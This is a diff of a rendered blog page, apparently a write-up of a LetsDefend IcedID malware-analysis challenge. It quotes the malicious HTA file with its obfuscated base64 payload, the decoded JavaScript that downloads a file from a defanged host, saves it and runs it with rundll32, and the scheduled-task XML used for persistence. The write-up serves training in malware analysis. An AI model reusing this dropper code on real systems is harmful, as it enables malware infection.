@@ -57,6 +57,10 @@ Now that we have the malicious Word document, we can check it for macros using o
   <link rel="stylesheet" type="text/css" href="/css/styles.css">
 
   
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
+  
 
   
   
@@ -274,25 +278,26 @@ Let&rsquo;s Defend IcedID Malware Family - <a href="https://app.letsdefend.io/ch
 <p>The content of the <code>collectionBoxConst.hta</code> file is:</p>
 <p><img src="https://i.imgur.com/KYyvfmI.png" alt=""></p>
 <p>And here is a text representation:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">html&gt;
+<pre><code class="language-html">html&gt;
 body&gt;
-div id=&#39;copyCurrencyMemory&#39;&gt;fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=aGVsbG8fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=aGVsbG8msscriptcontrol.scriptcontrol&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vConstBorder&#39;</span>&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&lt;/<span style="color:#f92672">div</span>&gt;
+div id='copyCurrencyMemory'&gt;fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=aGVsbG8fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=aGVsbG8msscriptcontrol.scriptcontrol&lt;/div&gt;&lt;div id='vConstBorder'&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&lt;/div&gt;
 
-script language=&#39;javascript&#39;&gt;
-function WLongPtr(altListVba){return(new ActiveXObject(altListVba));}function objButtBool(headerListbox){return(removeConstFunction.getElementById(headerListbox).innerHTML);}function boolOptionClass(){return(objButtBool(&#39;vConstBorder&#39;));}function sinBooleanCur(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var memSetByte=&#39;&#39;; var w=String.fromCharCode; var L=s.length;var intBorder = zeroI(&#39;tArahc&#39;);for(i=0;i&lt;<span style="color:#f92672">64</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">++){</span><span style="color:#a6e22e">e</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">boolOptionClass</span><span style="color:#960050;background-color:#1e0010">()[</span><span style="color:#a6e22e">intBorder</span><span style="color:#960050;background-color:#1e0010">](</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">)]=</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">;}</span><span style="color:#a6e22e">for</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">0;x&lt;L;x++){c=e[s[intBorder](x)];b=(b&lt;&lt;6)+c;l+=6;while(l</span>&gt;=8){((a=(b&gt;&gt;&gt;(l-=8))&amp;0xff)||(x&lt;(L-2)))&amp;&amp;(memSetByte+=w(a));}}return(memSetByte);};function zeroI(genTempTextbox){return genTempTextbox.split(&#39;&#39;).reverse().join(&#39;&#39;);}procDocumentI = window;removeConstFunction = document;procDocumentI.resizeTo(1, 1);procDocumentI.moveTo(-100, -100);var genericBoolean = removeConstFunction.getElementById(&#39;copyCurrencyMemory&#39;).innerHTML.split(&#34;aGVsbG8&#34;);var collectRightSingle = zeroI(sinBooleanCur(genericBoolean[0]));var vData = zeroI(sinBooleanCur(genericBoolean[1]));var viewPointerConvert = genericBoolean[2];
+script language='javascript'&gt;
+function WLongPtr(altListVba){return(new ActiveXObject(altListVba));}function objButtBool(headerListbox){return(removeConstFunction.getElementById(headerListbox).innerHTML);}function boolOptionClass(){return(objButtBool('vConstBorder'));}function sinBooleanCur(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var memSetByte=''; var w=String.fromCharCode; var L=s.length;var intBorder = zeroI('tArahc');for(i=0;i&lt;64;i++){e[boolOptionClass()[intBorder](i)]=i;}for(x=0;x&lt;L;x++){c=e[s[intBorder](x)];b=(b&lt;&lt;6)+c;l+=6;while(l&gt;=8){((a=(b&gt;&gt;&gt;(l-=8))&amp;0xff)||(x&lt;(L-2)))&amp;&amp;(memSetByte+=w(a));}}return(memSetByte);};function zeroI(genTempTextbox){return genTempTextbox.split('').reverse().join('');}procDocumentI = window;removeConstFunction = document;procDocumentI.resizeTo(1, 1);procDocumentI.moveTo(-100, -100);var genericBoolean = removeConstFunction.getElementById('copyCurrencyMemory').innerHTML.split(&quot;aGVsbG8&quot;);var collectRightSingle = zeroI(sinBooleanCur(genericBoolean[0]));var vData = zeroI(sinBooleanCur(genericBoolean[1]));var viewPointerConvert = genericBoolean[2];
 /script&gt;
 
-script language=&#39;vbscript&#39;&gt;Function classResponseLocal(copyCurrencyMemory) : Set snglSngTpl = CreateObject(viewPointerConvert) : With snglSngTpl : .language = &#34;jscript&#34; : .timeout = 60000 : .eval(copyCurrencyMemory) : End With : End Function
+script language='vbscript'&gt;Function classResponseLocal(copyCurrencyMemory) : Set snglSngTpl = CreateObject(viewPointerConvert) : With snglSngTpl : .language = &quot;jscript&quot; : .timeout = 60000 : .eval(copyCurrencyMemory) : End With : End Function
 
 /script&gt;
-script language=&#39;vbscript&#39;&gt;Call classResponseLocal(collectRightSingle)
+script language='vbscript'&gt;Call classResponseLocal(collectRightSingle)
 /script&gt;
 
-script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style="color:#960050;background-color:#1e0010">&lt;</span>/script script language=&#39;javascript&#39;&gt;procDocumentI[&#39;close&#39;]();
+script language='vbscript'&gt;Call classResponseLocal(vData)&lt;/script script language='javascript'&gt;procDocumentI['close']();
 /script&gt;
 /body&gt;
 /html&gt;
-</code></pre></div><p>We can see that there&rsquo;s a large base64 string, but if we try to decode it all at once, we get gibberish mixed with garbage data:</p>
+</code></pre>
+<p>We can see that there&rsquo;s a large base64 string, but if we try to decode it all at once, we get gibberish mixed with garbage data:</p>
 <p><img src="https://i.imgur.com/c1LgzZZ.png" alt=""></p>
 <p>But if we look deeper at the Javascript of the HTML, we can determine that the base64 encoded data is being split by <code>aGVsbG8</code>, which means this is meant to separate 2 base64 encoded data chunks.</p>
 <ul>
@@ -310,12 +315,14 @@ script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style=
 </ol>
 <p>More seemingly garbage data, but if you look closely, you&rsquo;ll notice that there appears to be a file path in both strings. And if you read through the Javascript within the <code>.hta</code> file, you&rsquo;ll also notice that in addition to splitting the data on <code>aGVsbG8</code>, it also reverses the data chunks, so it&rsquo;s simply backwards.</p>
 <p>We can replicate this in Python by running:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">print(garbageString[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
-</code></pre></div><p>where <code>garbageString</code> is our backwards data. This will result in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#a6e22e">dateIntegerR</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;msxml2.xmlhttp&#34;</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC&#34;</span>, <span style="color:#66d9ef">false</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">send</span>();<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>){<span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">varLst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;adodb.stream&#34;</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">open</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">responsebody</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">savetofile</span>(<span style="color:#e6db74">&#34;c:\users\public\collectionBoxConst.jpg&#34;</span>, <span style="color:#ae81ff">2</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">close</span>;}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}}
+<pre><code class="language-python3">print(garbageString[::-1])
+</code></pre>
+<p>where <code>garbageString</code> is our backwards data. This will result in:</p>
+<pre><code class="language-Javascript">dateIntegerR = new ActiveXObject(&quot;msxml2.xmlhttp&quot;);dateIntegerR.open(&quot;GET&quot;, &quot;hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC&quot;, false);dateIntegerR.send();if(dateIntegerR.status == 200){try{var varLst = new ActiveXObject(&quot;adodb.stream&quot;);varLst.open;varLst.type = 1;varLst.write(dateIntegerR.responsebody);varLst.savetofile(&quot;c:\users\public\collectionBoxConst.jpg&quot;, 2);varLst.close;}catch(e){}}
 
-<span style="color:#a6e22e">trustReferenceConst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;wscript.shell&#34;</span>);<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bytesLStruct</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;scripting.filesystemobject&#34;</span>);<span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#34;rundll32 c:\users\public\collectionBoxConst.jpg,PluginInit&#34;</span>);<span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">repoVObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">CurrentDirectory</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\collectionBoxConst.hta&#34;</span>;<span style="color:#a6e22e">bytesLStruct</span>.<span style="color:#a6e22e">deletefile</span>(<span style="color:#a6e22e">repoVObject</span>);}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">indexIndexNext</span>){}
-</code></pre></div><p>The first half will:</p>
+trustReferenceConst = new ActiveXObject(&quot;wscript.shell&quot;);var bytesLStruct = new ActiveXObject(&quot;scripting.filesystemobject&quot;);trustReferenceConst.run(&quot;rundll32 c:\users\public\collectionBoxConst.jpg,PluginInit&quot;);try{repoVObject = trustReferenceConst.CurrentDirectory + &quot;\collectionBoxConst.hta&quot;;bytesLStruct.deletefile(repoVObject);}catch(indexIndexNext){}
+</code></pre>
+<p>The first half will:</p>
 <ul>
 <li>Make a GET request to hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</li>
 <li>Then save the response data from the GET request to a file located at <code>C:\Users\Public\collectionBoxConst.jpg</code></li>
@@ -392,66 +399,68 @@ script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style=
 </ol>
 <p><code>C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat</code></p>
 <p>The contents of <code>2021-06-02-scheduled-task.txt</code> will point us in the correct direction for this question:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
-<span style="color:#f92672">&lt;Task</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.2&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span style="color:#f92672">&gt;</span>
-  <span style="color:#f92672">&lt;RegistrationInfo&gt;</span>
-    <span style="color:#f92672">&lt;URI&gt;</span>\{B9C2BAC4-FDCF-449C-896A-9BEA1C23FBE8}<span style="color:#f92672">&lt;/URI&gt;</span>
-  <span style="color:#f92672">&lt;/RegistrationInfo&gt;</span>
-  <span style="color:#f92672">&lt;Triggers&gt;</span>
-    <span style="color:#f92672">&lt;TimeTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;TimeTrigger&#34;</span><span style="color:#f92672">&gt;</span>
-      <span style="color:#f92672">&lt;Repetition&gt;</span>
-        <span style="color:#f92672">&lt;Interval&gt;</span>PT1H<span style="color:#f92672">&lt;/Interval&gt;</span>
-        <span style="color:#f92672">&lt;StopAtDurationEnd&gt;</span>false<span style="color:#f92672">&lt;/StopAtDurationEnd&gt;</span>
-      <span style="color:#f92672">&lt;/Repetition&gt;</span>
-      <span style="color:#f92672">&lt;StartBoundary&gt;</span>2012-01-01T12:00:00<span style="color:#f92672">&lt;/StartBoundary&gt;</span>
-      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
-    <span style="color:#f92672">&lt;/TimeTrigger&gt;</span>
-    <span style="color:#f92672">&lt;LogonTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;LogonTrigger&#34;</span><span style="color:#f92672">&gt;</span>
-      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
-      <span style="color:#f92672">&lt;UserId&gt;</span>user1<span style="color:#f92672">&lt;/UserId&gt;</span>
-    <span style="color:#f92672">&lt;/LogonTrigger&gt;</span>
-  <span style="color:#f92672">&lt;/Triggers&gt;</span>
-  <span style="color:#f92672">&lt;Settings&gt;</span>
-    <span style="color:#f92672">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span style="color:#f92672">&lt;/MultipleInstancesPolicy&gt;</span>
-    <span style="color:#f92672">&lt;DisallowStartIfOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/DisallowStartIfOnBatteries&gt;</span>
-    <span style="color:#f92672">&lt;StopIfGoingOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/StopIfGoingOnBatteries&gt;</span>
-    <span style="color:#f92672">&lt;AllowHardTerminate&gt;</span>false<span style="color:#f92672">&lt;/AllowHardTerminate&gt;</span>
-    <span style="color:#f92672">&lt;StartWhenAvailable&gt;</span>true<span style="color:#f92672">&lt;/StartWhenAvailable&gt;</span>
-    <span style="color:#f92672">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfNetworkAvailable&gt;</span>
-    <span style="color:#f92672">&lt;IdleSettings&gt;</span>
-      <span style="color:#f92672">&lt;Duration&gt;</span>PT10M<span style="color:#f92672">&lt;/Duration&gt;</span>
-      <span style="color:#f92672">&lt;WaitTimeout&gt;</span>PT1H<span style="color:#f92672">&lt;/WaitTimeout&gt;</span>
-      <span style="color:#f92672">&lt;StopOnIdleEnd&gt;</span>true<span style="color:#f92672">&lt;/StopOnIdleEnd&gt;</span>
-      <span style="color:#f92672">&lt;RestartOnIdle&gt;</span>false<span style="color:#f92672">&lt;/RestartOnIdle&gt;</span>
-    <span style="color:#f92672">&lt;/IdleSettings&gt;</span>
-    <span style="color:#f92672">&lt;AllowStartOnDemand&gt;</span>true<span style="color:#f92672">&lt;/AllowStartOnDemand&gt;</span>
-    <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
-    <span style="color:#f92672">&lt;Hidden&gt;</span>false<span style="color:#f92672">&lt;/Hidden&gt;</span>
-    <span style="color:#f92672">&lt;RunOnlyIfIdle&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfIdle&gt;</span>
-    <span style="color:#f92672">&lt;WakeToRun&gt;</span>false<span style="color:#f92672">&lt;/WakeToRun&gt;</span>
-    <span style="color:#f92672">&lt;ExecutionTimeLimit&gt;</span>PT0S<span style="color:#f92672">&lt;/ExecutionTimeLimit&gt;</span>
-    <span style="color:#f92672">&lt;Priority&gt;</span>7<span style="color:#f92672">&lt;/Priority&gt;</span>
-  <span style="color:#f92672">&lt;/Settings&gt;</span>
-  <span style="color:#f92672">&lt;Actions</span> <span style="color:#a6e22e">Context=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;Exec&gt;</span>
-      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
-      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
-    <span style="color:#f92672">&lt;/Exec&gt;</span>
-  <span style="color:#f92672">&lt;/Actions&gt;</span>
-  <span style="color:#f92672">&lt;Principals&gt;</span>
-    <span style="color:#f92672">&lt;Principal</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
-      <span style="color:#f92672">&lt;UserId&gt;</span>LAPTOP-SH63S8O\user1<span style="color:#f92672">&lt;/UserId&gt;</span>
-      <span style="color:#f92672">&lt;LogonType&gt;</span>InteractiveToken<span style="color:#f92672">&lt;/LogonType&gt;</span>
-      <span style="color:#f92672">&lt;RunLevel&gt;</span>LeastPrivilege<span style="color:#f92672">&lt;/RunLevel&gt;</span>
-    <span style="color:#f92672">&lt;/Principal&gt;</span>
-  <span style="color:#f92672">&lt;/Principals&gt;</span>
-<span style="color:#f92672">&lt;/Task&gt;</span>
-</code></pre></div><p>This is an XML configuration file for a scheduled task, the <code>&lt;Exec&gt;</code> portion is what we should focus on:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;Exec&gt;</span>
-      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
-      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
-    <span style="color:#f92672">&lt;/Exec&gt;</span>
-</code></pre></div><p>This will set a scheduled task which will run <code>rundll32.exe &quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;</code>. But our question is only interested in the arguments supplied to the executed command.</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;URI&gt;\{B9C2BAC4-FDCF-449C-896A-9BEA1C23FBE8}&lt;/URI&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;TimeTrigger id=&quot;TimeTrigger&quot;&gt;
+      &lt;Repetition&gt;
+        &lt;Interval&gt;PT1H&lt;/Interval&gt;
+        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
+      &lt;/Repetition&gt;
+      &lt;StartBoundary&gt;2012-01-01T12:00:00&lt;/StartBoundary&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;/TimeTrigger&gt;
+    &lt;LogonTrigger id=&quot;LogonTrigger&quot;&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+      &lt;UserId&gt;user1&lt;/UserId&gt;
+    &lt;/LogonTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Settings&gt;
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
+    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
+    &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
+    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
+    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
+    &lt;IdleSettings&gt;
+      &lt;Duration&gt;PT10M&lt;/Duration&gt;
+      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
+      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
+    &lt;/IdleSettings&gt;
+    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Hidden&gt;false&lt;/Hidden&gt;
+    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
+    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
+    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
+    &lt;Priority&gt;7&lt;/Priority&gt;
+  &lt;/Settings&gt;
+  &lt;Actions Context=&quot;Author&quot;&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
+      &lt;Arguments&gt;&quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&quot;Author&quot;&gt;
+      &lt;UserId&gt;LAPTOP-SH63S8O\user1&lt;/UserId&gt;
+      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
+      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+&lt;/Task&gt;
+</code></pre>
+<p>This is an XML configuration file for a scheduled task, the <code>&lt;Exec&gt;</code> portion is what we should focus on:</p>
+<pre><code class="language-xml">&lt;Exec&gt;
+      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
+      &lt;Arguments&gt;&quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+</code></pre>
+<p>This will set a scheduled task which will run <code>rundll32.exe &quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;</code>. But our question is only interested in the arguments supplied to the executed command.</p>
 <ol start="13">
 <li>With OSINT, what is the malware family name used in this PCAP capture?</li>
 </ol>
